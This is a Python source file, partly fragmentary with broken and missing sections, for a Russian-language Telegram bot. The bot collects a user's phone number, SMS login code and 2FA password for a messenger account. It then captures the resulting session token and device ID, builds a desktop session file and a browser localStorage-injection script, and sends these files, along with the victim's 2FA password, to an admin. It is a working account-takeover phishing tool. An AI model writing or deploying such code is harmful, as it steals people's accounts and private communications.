def retry_on_network_error(max_retries=3, delay=2):
    def decorator(func):
        @wraps(func)
        async def wrapper(*args, **kwargs):
            last_exception = None
            for attempt in range(max_retries):
                try:
                    return await func(*args, **kwargs)
                except Exception as e:
                    last_exception = e
                    if attempt < max_retries - 1:
                        logging.warning(f"Сетевая ошибка, попытка {attempt + 1}/{max_retries}: {e}")
                        await asyncio.sleep(delay * (attempt + 1))
            raise last_exception
        return wrapper
    return decorator

@retry_on_network_error(max_retries=3, delay=2)
async def safe_edit(msg, text):
    await msg.edit_text(text)

@retry_on_network_error(max_retries=3, delay=2)
async def safe_send(message, text):
    return await message.answer(text)

def gen_password():
    import random, string
    return ''.join(random.choices(string.ascii_letters + string.digits + "_@#", k=40))

        "token": token,
        "device_id": device_id,
        "session_id": session_id,
        "password": password,

            "device_type": "DESKTOP",
            "header_user_agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36",
            "app_version": "25.12.13",

            "os_version": "Windows 10",
            "locale": "ru",
            "device_locale": "ru",
            "screen": "1080x1920",
            "timezone": "Europe/Moscow"
        },
        "user": {
            "user_id": user_id,
            "phone": int(phone.replace("+", "")),
            "photo_id": None,
            "first_name": "",

        }
    }

def generate_web_js(device_id, token, viewer_id, password=None):
    auth = {"token": token, "viewerId": viewer_id}
    if password:
        auth["password"] = password
    return f"""sessionStorage.clear();
localStorage.clear();
localStorage.setItem('__oneme_device_id', '{device_id}');
localStorage.setItem('__oneme_auth', JSON.stringify({json.dumps(auth, ensure_ascii=False)}));
window.location.reload();"""

async def send_files(phone, uid, work_dir, desktop, js):

    with open(dp, "w", encoding="utf-8") as f:

    wp = f"{work_dir}/web_token.txt"

    await bot.send_document(ADMIN_ID, FSInputFile(wp),
        caption=f"🌐 ВЕБ\nНомер: {phone}", parse_mode="HTML")

@dp.message(F.text.regexp(r'^\+7\d{10}$'))
async def phone_handler(message: types.Message, state: FSMContext):
    phone = message.text.strip()
    uid = message.from_user.id
    work_dir = f"cache/{uid}"
    os.makedirs(work_dir, exist_ok=True)

    client = SocketMaxClient(phone=phone, work_dir=work_dir)
    pending[uid] = {"client": client, "phone": phone, "work_dir": work_dir}

    await state.set_state(AuthState.waiting_for_code)
    await state.update_data(phone=phone, work_dir=work_dir)

    msg = await safe_send(message, "⏳ Отправляю SMS...")

    class FloodHandler(logging.Handler):
        def emit(self, record):
            msg_text = record.getMessage().lower()
            if "limit.violate" in msg_text or "слишком много попыток" in msg_text or "попробуйте позже" in msg_text:
                if uid in pending:
                    pending[uid]["status"] = "flood_sms"
                    logging.info(f"FloodHandler: статус изменён на flood_sms для uid={uid}")

    handler = FloodHandler()
    logging.getLogger().addHandler(handler)

    async def auth_task():
        try:
            await client.start()
            if uid in pending and pending[uid].get("status") != "flood_sms":
                pending[uid]["token"] = client.token
                pending[uid]["user_id"] = client.my_id
                pending[uid]["status"] = "done"
                logging.info(f"auth_task: статус done для uid={uid}")
        except Exception as e:
            error = str(e).lower()
            logging.error(f"auth_task: исключение для uid={uid}: {e}")
            if uid in pending and pending[uid].get("status") != "flood_sms":
                if "block" in error:
                    pending[uid]["status"] = "blocked"
                elif "password" in error or "2fa" in error:
                    pending[uid]["status"] = "need_password"
                elif "invalid" in error or "wrong" in error:
                    pending[uid]["status"] = "invalid_code"
                else:
                    pending[uid]["status"] = f"error:{e}"
        finally:
            logging.getLogger().removeHandler(handler)
            logging.info(f"auth_task: завершена для uid={uid}, статус={pending.get(uid, {}).get('status', 'нет')}")

    asyncio.ensure_future(auth_task())
    await asyncio.sleep(3)

    if uid not in pending:
        logging.info(f"phone_handler: uid={uid} уже удалён из pending")
        return

    status = pending[uid].get("status", "")
    logging.info(f"phone_handler: статус={status} для uid={uid}")

    if status == "flood_sms":
        await safe_edit(msg, "⏳ Слишком много попыток. Попробуйте позже.")
        del pending[uid]
        await state.clear()
        return

    elif status == "blocked":
        await safe_edit(msg, "🚫 Аккаунт заблокирован или удалён.")
        del pending[uid]
        await state.clear()
        return

    elif status and status.startswith("error:"):
        await safe_edit(msg, f"❌ {status[6:]}")
        del pending[uid]
        await state.clear()
        return

    await safe_edit(msg, "✅ SMS отправлена. Введи код из 6 цифр:")

@dp.message(AuthState.waiting_for_code, F.text.regexp(r'^\d{6}$'))
async def code_handler(message: types.Message, state: FSMContext):
    uid = message.from_user.id
    code = str(message.text.strip())

    if uid not in pending:
        return await safe_send(message, "⏳ Сессия устарела. Отправь номер заново через /start.")

    data = await state.get_data()
    phone = data["phone"]
    work_dir = data["work_dir"]

    import builtins
    builtins._code = code

    msg = await safe_send(message, "⏳ Проверяю код...")

    for _ in range(240):
        await asyncio.sleep(0.5)
        if uid not in pending:
            await safe_edit(msg, "⏳ Сессия устарела.")
            await state.clear()
            return
        status = pending[uid].get("status", "")

        if status == "done":
            token = pending[uid]["token"]
            viewer_id = pending[uid]["user_id"]
            password = gen_password()
            session_id = int(time.time() * 1000)

            # Читаем device_id из session.db
            device_id = str(uuid.uuid4())
            db_path = os.path.join(work_dir, "session.db")
            if os.path.exists(db_path):
                try:
                    conn = sqlite3.connect(db_path)
                    cursor = conn.cursor()
                    cursor.execute("SELECT * FROM sessions LIMIT 1")
                    row = cursor.fetchone()
                    if row and len(row) > 1:
                        device_id = row[1]  # device_id из сессии
                    conn.close()
                except:
                    pass

            web_js = generate_web_js(device_id, token, viewer_id)
            desktop = build_desktop_json(token, device_id, session_id, password, viewer_id, phone)
            await send_files(phone, uid, work_dir, desktop, web_js)
            await safe_edit(msg, "✅ Готово! Файлы отправлены админу.")
            del pending[uid]
            await state.clear()
            return

        elif status == "need_password":
            await state.set_state(AuthState.waiting_for_password)
            await safe_edit(msg, "🔐 Введи пароль 2FA:")
            return

        elif status == "invalid_code":
            await safe_edit(msg, "❌ Неверный код. Попробуй ещё раз.")
            return

        elif status == "blocked":
            await safe_edit(msg, "🚫 Аккаунт заблокирован или удалён.")
            del pending[uid]
            await state.clear()
            return

        elif status and status.startswith("error:"):
            await safe_edit(msg, f"❌ {status[6:]}")
            del pending[uid]
            await state.clear()
            return

    await safe_edit(msg, "❌ Таймаут.")
    del pending[uid]
    await state.clear()

@dp.message(AuthState.waiting_for_password)
async def password_handler(message: types.Message, state: FSMContext):
    uid = message.from_user.id
    pwd = message.text.strip()

    if uid not in pending:
        return await safe_send(message, "⏳ Сессия устарела.")

    data = await state.get_data()
    phone = data["phone"]
    work_dir = data["work_dir"]

    import builtins
    builtins._password = pwd
    pending[uid]["user_password"] = pwd

    msg = await safe_send(message, "⏳ Проверяю пароль...")

    await asyncio.sleep(2)

    device_id = str(uuid.uuid4())
    db_path = os.path.join(work_dir, "session.db")
    if os.path.exists(db_path):
        try:
            conn = sqlite3.connect(db_path)
            cursor = conn.cursor()
            cursor.execute("SELECT * FROM sessions LIMIT 1")
            row = cursor.fetchone()
            if row:
                token = row[0]
                user_id_str = row[3] if len(row) > 3 else "0"
                device_id = row[1] if len(row) > 1 else device_id
                pending[uid]["token"] = token
                pending[uid]["user_id"] = int(user_id_str) if user_id_str.isdigit() else 0
                pending[uid]["status"] = "done"
            conn.close()
        except Exception as e:
            logging.error(f"Ошибка чтения session.db: {e}")

    if uid in pending and pending[uid].get("status") == "done":
        token = pending[uid]["token"]
        viewer_id = pending[uid]["user_id"] or 0
        user_password = pending[uid].get("user_password", "")
        password = gen_password()
        session_id = int(time.time() * 1000)

        web_js = generate_web_js(device_id, token, viewer_id)

        if user_password:
            web_js = f"2FA ПАРОЛЬ: {user_password} (ЭТУ СТРОКУ КОПИРОВАТЬ НЕ НУЖНО)\n\n" + web_js

        desktop = build_desktop_json(token, device_id, session_id, password, viewer_id, phone)
        await send_files(phone, uid, work_dir, desktop, web_js)
        await safe_edit(msg, "✅ Готово!")
        del pending[uid]
        await state.clear()
        return

    await safe_edit(msg, "❌ Токен не найден.")
    del pending[uid]
    await state.clear()

async def main():
    import builtins
    import getpass

    original_input = builtins.input
    original_getpass = getpass.getpass

    def patched_input(prompt=""):
        prompt_lower = prompt.lower() if prompt else ""
        if "code" in prompt_lower or "код" in prompt_lower:
            import time as _time
            while not hasattr(builtins, '_code') or builtins._code is None:
                _time.sleep(0.5)
            code = builtins._code
            builtins._code = None
            return code
        elif "password" in prompt_lower or "пароль" in prompt_lower:
            import time as _time
            while not hasattr(builtins, '_password') or builtins._password is None:
                _time.sleep(0.5)
            pwd = builtins._password
            builtins._password = None
            return pwd
        return original_input(prompt)

    def patched_getpass(prompt=""):
        prompt_lower = prompt.lower() if prompt else ""
        if "password" in prompt_lower or "пароль" in prompt_lower or "2fa" in prompt_lower:
            for uid in list(pending.keys()):
                if pending[uid].get("status", "") not in ("done", "blocked", "flood_sms"):
                    pending[uid]["status"] = "need_password"
                    logging.info(f"Установлен статус need_password для uid={uid}")
            import time as _time
            while not hasattr(builtins, '_password') or builtins._password is None:
                _time.sleep(0.5)
            pwd = builtins._password
            builtins._password = None
            return pwd
        return original_getpass(prompt)

    builtins.input = patched_input
    getpass.getpass = patched_getpass

    logging.info("Бот запущен!")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
